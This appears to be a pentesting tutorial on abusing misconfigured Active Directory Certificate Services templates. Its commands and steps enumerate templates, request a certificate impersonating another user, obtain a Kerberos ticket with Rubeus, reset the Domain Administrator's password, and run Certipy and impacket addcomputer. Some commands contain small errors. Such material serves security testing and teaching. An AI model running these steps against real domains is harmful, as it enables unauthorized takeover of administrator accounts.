---
title: AD CS (Active Directory Certificate Services) Pentesting
description: AD CS is Public Key Infrastructure (PKI) implementation. The misconfiguration of certificate templates can be vulnerable to privilege escalation.
tags:
    - Active Directory
    - Privilege Escalation
    - Windows
refs:
date: 2023-01-22
draft: false
---

## Enumeration

We need to search which template is vulnerable to change permissions.   
To do this, run the following command.

```powershell
# List all certificate tempaltes
certutil -v -template > cert_templates.txt
```

To find the template which contains toxic parameters, use findstr command to extract the specific properties in the above output. However, before doing that, we need to check which groups the current user belongs to using “net user” command.

```powershell
# Retrieve the group to which the current user belongs.
# We expect the user belongs to "Domain Users" or "Domain Computers".
net user <username> /domain

# if we want to "OR" search strings, use "findstr" instead of "find"
# Template[: The head of each template
# TemplatePropCommonName: Find the template name
# Authentication: Find the "Client Authentication"
# Allow: Find the "Allow Enroll" or "Allow Full Control". We expect the current user's group is allowed "Enroll" or "Full Control".
# CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT: SAN (Subject Alternative Name)
cert_templates.txt | findstr "Template[ TemplatePropCommonName Authentication Allow CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT"
```

<br />

## Privilege Escalation with Microsoft Management Console (MMC)

If we find the template which contains vulnerable parameters, we can create a new certificate using the template and can gain access to the Administrator's account.  
There are some method to create the new one. However, this section provides the easiest way using MMC.  

### 1. Request a New “Malicious” Certificate with MMC

1. Right-click on the Windows icon, and select Run.
2. Enter **“mmc”** (Microsoft Management Console)* in the form and click OK. The console window opens.
3. In the MMC window, click **File → Add/Remote Snap-in.**.
4. Add the **“Certificates”** snap-in in the window then click OK.
5. Expand the Certificates in the left pane.
6. Right-click on the Personal and select **All Tasks → Request New Certificate**.
7. The Certificate Enrollment window, click Next twice.
8. In Request Certificates section, click the **“More information is required to enroll…”**.
9. In Certificate Properties window, choose types and enter values in the form.
    
    Subject name:
    
    - Type: Common name
    - Value: **vulncert** (specify an arbitrary name)
    
    Alternative name:
    
    - Type: User principal name
    - Value: **tester@abc.example.com**  (specify the impersonated name and the target domain)

10. Add each name and click OK.
11. Return to the Request Certificates section. Check on the certificate we want to request, then click Enroll.
12. After finishing, expand **Personal → Certificates**. We should see the new certificate is added.
13. Double-click on the certificate. The Certificate window opens.
14. In the Certificate window, select **Details** tab and choose **Subject Alternative Name**. We should see the principal name is our specified name e.g. tester@abc.example.com. If we can, click OK to close the window.
15. At the end, in the MMC window, right-click on the new certificate which we created and select **All Tasks → Export…** to export the certificate. The Certificate Export Wizard opens.
16. In Export Private Key section, select **“Yes, export the private key”** and click Next.
17. In Export File Format, it is usually okey the default .PFX format so click Next without any changes.
18. In Security section, check the Password and enter new password.
19. In File to Export section, enter the file name and Next.
20. Finally click Finish then we could export the new malicious certificate.

### 2. Impersonate User using the Malicious Certificate

If we create a new certificate, we can use it to impersonate the privileged user.

1. **Request Kerberos TGT (Ticket Granting Ticket).**
    
    **[Rubeus.exe](https://github.com/GhostPack/Rubeus)** is useful to do for that. For details, see [Privilege Escalation with Kerberos](/exploit/kerberos-pentesting/#privilege-escalation-with-kerberos).
    
    ```powershell
    Rubeus.exe asktgt /user:tester /enctype:aes256 /certificate:vulncert.pfx /password:password /outfile:tester.kirbi /domain:labc.example.com /dc:<ip_of_the_domain_controller>
    ```
    
    After that, we should get the TGT (.kirbi file).  
    We can gain access using the TGT by changing the password of the DA account.
    
2. **Change the Password of the DA (Domain Administrator) Account.**
    
    ```powershell
    # changepw: Change the password of the target user
    # /ticket: Specify the TGT file (.kirbi) we've generated
    # /new: New password for impersonated user
    # /targetuser: Specify the Domain Administrator account name
    Rubeus.exe changepw /ticket:tester.kirbi /new:newpass /dc:<ip_of_the_domain_controller> /targetuser:abc.example.com\<da_user_name>
    ```
    
3. **Get the Administrator’s Shell**
    
    Using **runas** command, we can gain access to the Administrator’s account.  
    Use the new password which we’ve given the previous section in prompt.
    
    ```powershell
    runas /user:abc.example.com\<da_user_name> cmd.exe
    ```

<br />

## Privilege Escalation with Certipy

**[Certipy](https://github.com/ly4k/Certipy)** is a tool for enumerating and abusing of AD CS.

### 1. Request a New "Malicious" Certificate

```sh
# User Template
certipy req 'vuln.local/username:password@vuln.com' -ca VULN-CA  -template User
# Machine Template
certipy req 'vuln.local/machine-name:machine-password@vuln.com' -ca VULN-CA -template Machine

# After requesting it, use the output credential when authenticating
certipy auth -pfx user.pfx
certipy auth -pfx machine.pfx
```

### 2. Add Our Computer to the Domain

We can use the **addcomputer ([impacket](https://github.com/SecureAuthCorp/impacket))** which is usually used for AD CS (Active Directory Certificate Services) Privilege Escalation.

```sh
python3 ./impacket/examples/addcomputer.py '<domain-name>/username:password' -method LDAPS -computer-name 'PC-NAME' -computer-pass 'MyPcPassword'
# or
python3 ./impacket/examples/addcomputer.py '<domain-name>/username:password@<hostname>' -method LDAPS -computer-name 'PC-NAME' -computer-pass 'MyPcPassword'
```
